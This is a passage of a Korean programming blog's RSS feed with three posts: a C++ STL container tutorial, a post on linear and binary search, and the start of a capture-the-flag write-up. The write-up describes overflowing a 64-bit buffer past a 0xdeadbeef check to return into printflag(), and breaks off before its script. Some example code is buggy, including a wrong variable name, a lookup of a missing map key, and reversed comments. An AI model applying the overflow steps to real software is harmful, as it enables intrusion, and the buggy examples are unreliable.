삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="set의-기능"><a href="#set의-기능" class="headerlink" title="set의 기능"></a>set의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="set-사용-예제"><a href="#set-사용-예제" class="headerlink" title="set 사용 예제"></a>set 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s1;</span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator iter;</span><br><span class="line"></span><br><span class="line">    s1.insert(<span class="number">1</span>);</span><br><span class="line">    s1.insert(<span class="number">2</span>);</span><br><span class="line">    s1.insert(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(iter = s1.begin(); iter != s1.end(); iter++)&#123; <span class="comment">// iterator</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *iter &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (s1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// s1 empty check(true/false)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s1.size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// size 반환(result : 3)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; s1.max_size() &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 최대 size 반환</span></span><br><span class="line"></span><br><span class="line">    s1.erase(<span class="number">3</span>); <span class="comment">// s1의 원소 3 지우기</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt;::iterator iter2 = s1.find(<span class="number">2</span>); <span class="comment">// s1에서 2의 값을 검색</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(iter2 == s1.end())&#123; <span class="comment">// 조건문 시작 만약 find해서 결과를 못찾았다면?</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;not found..&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// not found</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123; <span class="comment">// 결과가 있다면?</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;found!!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// found</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s1.clear(); <span class="comment">// s1의 모든 원소 지우기</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p>map은 set과 같이 associative container의 종류로 노드 기반으로 이루어진 균형 이진 트리 구조이다.</p><p>map은 key, value로 이루어져 있고 pair 객체 형태로 저장된다.</p><p>key는 중복이 불가능(multimap에서는 사용이 가능하다)하며, set과 동일하게 원소가 삽입되면서 자동으로 오름차순 정렬이 된다.</p><p>map은 저장 공간의 필요에 따라서 allocator(동적 할당) 객체를 사용한다.</p><h3 id="map-선언"><a href="#map-선언" class="headerlink" title="map 선언"></a>map 선언</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m1;</span><br></pre></td></tr></table></figure><h3 id="map-반복자-iterator"><a href="#map-반복자-iterator" class="headerlink" title="map 반복자(iterator)"></a>map 반복자(iterator)</h3><p>|Name|Context<br>|s1.begin()| 첫번째 원소를 가리킨다.<br>|s1.end()| 마지막 원소를 가리킨다.<br>|s1.rbegin()| 거꾸로해서 첫번째 원소를 가리킨다. (즉, 마지막 원소 = 첫번째)<br>|s1.rend()| 거꾸로해서 마지막 원소를 가리킨다. (즉, 첫번째 원소 = 마지막)<br>|s1.cbegin()| begin과 동일하나 const로 선언<br>|s1.cend()| end과 동일하나 const로 선언<br>|s1.crbegin()| rbegin과 동일하나 const로 선언<br>|s1.crend()| rend와 동일하나 const로 선언</p><h3 id="map-용량-크기-size-capacity"><a href="#map-용량-크기-size-capacity" class="headerlink" title="map 용량, 크기(size, capacity)"></a>map 용량, 크기(size, capacity)</h3><p>|Name|Context<br>|s1.empty()| set(s1)이 비어있는지 체크(true/false) 반환<br>|s1.size()| s1의 size(원소 갯수) 반환<br>|s1.max_size()| s1이 가질 수 있는 최대 사이즈(크기) 반환</p><h3 id="map-삽입-삭제"><a href="#map-삽입-삭제" class="headerlink" title="map 삽입, 삭제"></a>map 삽입, 삭제</h3><p>|Name|Context<br>|s1.insert()| s1에 원소 삽입<br>|s1.erase()| s1에 저장된 원소 삭제(지우기)<br>|s1.swap(s2)| s1에 저장된 원소와 s2를 변경(swap)<br>|s1.clear()| s1에 저장된 원소 모두 삭제<br>|s.emplace()| move()를 사용해서 객체 저장<br>|s.emplace_hint()| 삽입될 위치에 대한 힌트를 삽입</p><h3 id="map의-기능"><a href="#map의-기능" class="headerlink" title="map의 기능"></a>map의 기능</h3><p>|Name|Context<br>|s1.find()| s1에서 값을 검색(값이 있다면 iterator 반환, 아니면 end 반환)<br>|s1.count()| s1에 저장된 요소 개수 반환<br>|s1.lower_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.upper_bound()| s1의 요소의 위치에 대한 iterator 반환<br>|s1.equal_range()| 지정 요소에 대한 iterator 반환</p><h3 id="map-사용-예제"><a href="#map-사용-예제" class="headerlink" title="map 사용 예제"></a>map 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; m1;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"></span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key&quot;</span>, <span class="number">1</span>)); <span class="comment">// map에 key,value 삽입(make_pair 사용)</span></span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key2&quot;</span>, <span class="number">2</span>));</span><br><span class="line">    m1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key3&quot;</span>, <span class="number">3</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (m1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// map이 비어있는지 검사</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.count(<span class="string">&quot;key1&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 카운트 반환 1 or 0</span></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.count(<span class="string">&quot;key2&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// 카운트 반환 1 or 0</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; m1.find(<span class="string">&quot;key1&quot;</span>)-&gt;second &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// key1 검색</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator iter = m1.find(<span class="string">&quot;key4&quot;</span>); <span class="comment">// iterator key search</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(iter == m1.end())&#123; <span class="comment">// key를 못찾아서 end 반환했을 때</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;key not found&quot;</span> &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = m1.begin(); it != m1.end(); it++)&#123; <span class="comment">// iterator 접근</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>map은 set과 사용하는 멤버 함수가 동일하다.</li></ul><h2 id="unordered-set"><a href="#unordered-set" class="headerlink" title="unordered_set"></a>unordered_set</h2><p>set과 거의 동일하지만 unordered_set은 원소를 삽입할 때 정렬하지 않는 컨테이너이고,</p><p>set은 이진 탐색 트리의 구조지만 unordered_set은 해쉬 테이블의 구조를 가지고 있다.</p><h3 id="unordered-set-사용-예제"><a href="#unordered-set-사용-예제" class="headerlink" title="unordered_set 사용 예제"></a>unordered_set 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt; us1; <span class="comment">// 생성자 선언</span></span><br><span class="line">    <span class="built_in">unordered_set</span>&lt;<span class="keyword">int</span>&gt;::iterator it; <span class="comment">// iterator 선언</span></span><br><span class="line">    </span><br><span class="line">    us1.insert(<span class="number">1</span>); <span class="comment">// us1(set)에 원소 삽입</span></span><br><span class="line">    us1.insert(<span class="number">2</span>);</span><br><span class="line">    us1.insert(<span class="number">3</span>);</span><br><span class="line">    us1.insert(<span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = us1.begin(); it != us1.end(); it++)&#123; <span class="comment">//iterator 반복자</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; *it &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 출력</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h2><p>unordered_map 역시 map과 사용하는 방법은 동일하기 때문에 둘 중 어느것을 쓰던 문제가 없다.</p><p>다만 차이점이라면 set, unordered_set과 같이 이진 탐색 트리와 해쉬 테이블의 차이점을 가지고 있다.</p><p>속도가 빨라야 한다면 unordered_map를 사용하는 것도 권장할 수 있다.</p><p>하지만 데이터가 많아진다면 unordered_map 역시 속도가 느리다고 할 수 있는데,</p><p>결국 데이터가 적다면 unordered_map이 속도면에서는 유리하고 데이터가 많다면 map이 좋다.</p><h3 id="unordered-map-사용-예제"><a href="#unordered-map-사용-예제" class="headerlink" title="unordered_map 사용 예제"></a>unordered_map 사용 예제</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt; um1; <span class="comment">// 생성자</span></span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="built_in">string</span>, <span class="keyword">int</span>&gt;::iterator it;</span><br><span class="line"></span><br><span class="line">    um1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key1&quot;</span>, <span class="number">1</span>)); <span class="comment">// map에 원소 삽입(make_pair(key, value))</span></span><br><span class="line">    um1.insert(<span class="built_in">make_pair</span>(<span class="string">&quot;key2&quot;</span>, <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(it = um1.begin(); it != um1.end(); it++)&#123; <span class="comment">// iterator 반복문</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; it-&gt;first &lt;&lt; it-&gt;second &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; um1.find(<span class="string">&quot;key1&quot;</span>)-&gt;second &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// key find</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; (um1.empty() ? <span class="string">&quot;true&quot;</span>:<span class="string">&quot;false&quot;</span>) &lt;&lt; <span class="string">&quot;\n&quot;</span>; <span class="comment">// map(um1)이 비어있는지 체크하고 true/false 반환</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><p><a href="https://modoocode.com/">https://modoocode.com/</a></p></li><li><p><a href="https://blockdmask.tistory.com/76">https://blockdmask.tistory.com/76</a></p></li><li><p><a href="https://blockdmask.tistory.com/70">https://blockdmask.tistory.com/70</a></p></li><li><p><a href="https://hwan-shell.tistory.com/130">https://hwan-shell.tistory.com/130</a></p></li><li><p><a href="https://blankspace-dev.tistory.com/347">https://blankspace-dev.tistory.com/347</a></p></li><li><p><a href="https://twpower.github.io/91-how-to-use-map-in-cpp">https://twpower.github.io/91-how-to-use-map-in-cpp</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/C/">C++</category>
      
      <category domain="https://blog.jhyeon.dev/tags/STL/">STL</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/10/c-stl-200910/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>탐색 알고리즘(선형, 이진) 정리</title>
      <link>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/</link>
      <guid>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/</guid>
      <pubDate>Wed, 09 Sep 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;탐색-알고리즘-종류&quot;&gt;&lt;a href=&quot;#탐색-알고리즘-종류&quot; class=&quot;headerlink&quot; title=&quot;탐색 알고리즘 종류&quot;&gt;&lt;/a&gt;탐색 알고리즘 종류&lt;/h2&gt;&lt;h3 id=&quot;1-선형-탐색법-리니어-서치&quot;&gt;&lt;a href=&quot;#1-선형-탐</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="탐색-알고리즘-종류"><a href="#탐색-알고리즘-종류" class="headerlink" title="탐색 알고리즘 종류"></a>탐색 알고리즘 종류</h2><h3 id="1-선형-탐색법-리니어-서치"><a href="#1-선형-탐색법-리니어-서치" class="headerlink" title="1. 선형 탐색법 (리니어 서치)"></a>1. 선형 탐색법 (리니어 서치)</h3><ul><li><p>왼쪽부터 순서대로 하나씩 확인해 나가는 방법</p></li><li><p>(한쪽 끝에서 다른 한쪽 끝으로 나아가는 방법)</p></li><li><p>탐색 시작 → 결과를 탐색할 때까지 반복문 실행 → 결과값 반환 후 종료</p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span>(<span class="params">array, target</span>):</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(array):</span><br><span class="line"><span class="keyword">if</span> arr[i] == target:</span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>] <span class="comment"># index 0~6</span></span><br><span class="line">target = <span class="number">9</span></span><br><span class="line"></span><br><span class="line">print(search(array,target))</span><br><span class="line"></span><br><span class="line"><span class="comment">#result</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure><h3 id="2-이진-알고리즘-탐색-binary"><a href="#2-이진-알고리즘-탐색-binary" class="headerlink" title="2. 이진 알고리즘 탐색(binary)"></a>2. 이진 알고리즘 탐색(binary)</h3><ul><li><p>정렬된 리스트(배열) 에서 원하는 수(target) 값을 찾는 알고리즘 입니다.</p></li><li><p>선형 알고리즘 탐색 방법과 다르게 “이진 알고리즘” 탐색은 리스트가 정렬되어 있어야 한다는 점입니다.</p></li><li><p>배열의 전체의 중간 값(middle) 을 비교 합니다.</p></li><li><p>중간 값(middle) 이 원하는 수(target) 값보다 작다면 왼쪽, 크다면 오른쪽을 선택하여 탐색을 시작합니다.</p></li><li><p>선택된 방향에서 중간 값(middle) 과 원하는 수(target) 을 비교해서 같다면 탐색을 종료합니다.</p></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=UTF-8</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binarysearch</span>(<span class="params">array, target, left, right</span>):</span></span><br><span class="line">    middle_idx = (left+right)//<span class="number">2</span> <span class="comment"># 중간 지점 탐색</span></span><br><span class="line">    print(middle_idx)</span><br><span class="line">    middle = array[middle_idx] <span class="comment"># Array 배열 적용</span></span><br><span class="line">    <span class="keyword">if</span> target == middle: <span class="comment"># 탐색 값과 중간 값이 같다면</span></span><br><span class="line">        print(<span class="string">&#x27;result : &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(middle)) <span class="comment"># 결과 리턴</span></span><br><span class="line">    <span class="keyword">elif</span> middle &gt; target: <span class="comment"># 탐색 값이 중간 값 보다 크다면</span></span><br><span class="line">        binarysearch(array, target, left, middle_idx-<span class="number">1</span>) <span class="comment"># 함수실행</span></span><br><span class="line">    <span class="keyword">elif</span> middle &lt; target: <span class="comment"># 탐색 값이 중간 값 보다 작다면</span></span><br><span class="line">        binarysearch(array, target, middle_idx+<span class="number">1</span>, right) <span class="comment"># 함수실행</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># 위 경우 모두 만족하지 않을 때 false 반환</span></span><br><span class="line"></span><br><span class="line">array = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">9</span>,<span class="number">17</span>,<span class="number">15</span>,<span class="number">19</span>,<span class="number">21</span>]</span><br><span class="line"></span><br><span class="line">length = <span class="built_in">len</span>(array)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;length : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(length))</span><br><span class="line"></span><br><span class="line">array.sort()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;sort : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(array))</span><br><span class="line"></span><br><span class="line">target = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">left = <span class="number">0</span></span><br><span class="line">right = length-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">binarysearch(array, target, <span class="number">0</span>, right)</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://velog.io/@keemun/1">https://velog.io/@keemun/1</a></p></li><li><p><a href="https://velog.io/@madfinger/Binary-Search%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89-%ED%8C%8C%EC%9D%B4%EC%8D%AC">https://velog.io/@madfinger/Binary-Search이진-탐색-파이썬</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Algorithm/">Algorithm</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/">선형 탐색</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/">이진 탐색</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/09/10/search-algorithm-200910/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>SSTF 2020 BOF 101 Write up</title>
      <link>https://blog.jhyeon.dev/2020/08/18/sstf-200818/</link>
      <guid>https://blog.jhyeon.dev/2020/08/18/sstf-200818/</guid>
      <pubDate>Mon, 17 Aug 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자.&lt;/p&gt;
&lt;p&gt;사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PI</description>
        
      
      
      
      <content:encoded><![CDATA[<p>우선 file 명령어와 checksec을 사용해서 바이너리 컴파일 정보와, Memory Mitigation을 확인 해보자.</p><p>사진과 같이 x64 dynamic linked binary임을 알 수 있고, FULL RELRO, NX, PIE가 활성화 되어 있는 것을 알 수 있다.</p><p>IDA로 바이너리 분석을 해보면 main() 함수의 동작 로직은 다음과 같다.</p><p>바이너리가 실행되면 scanf 함수를 통해 사용자에게 입력받는 로직이고, 0xdeadbeef 값을 세팅하고 있어</p><p>BOF를 통해 해당 메모리 영역을 덮어버리면 BOF Detected!! 가 발생한다.</p><p>그럼 시나리오는 다음과 같이 생각해볼 수 있다.</p><p>입력 받는 메모리 공간은 rbp-0x90(144) 만큼을 받고 있으니, 140만큼 써주고 체크 로직을 통과하기 위해 나머지 4byte 값을 0xdeadbeef 로 만들어 준다음,</p><p>RSP를 8byte dummy로 채우고 RET 에서 printflag() 함수로 리턴 시켜준다면 플래그를 획득할 수 있는 구조가 된다.</p><p>32비트 환경에서 컴파일 된 바이너리는 SFP(4byte) + RET(4byte)를 가지지만,</p><p>64비트 환경에서 컴파일 된 바이너리는 RSP(8byte) + RET(6byte)의 값을 가지는 것을 고려해주면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"> <span class="number">2</span> </span><br><span class="line"> <span class="number">3</span> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="comment">#p = 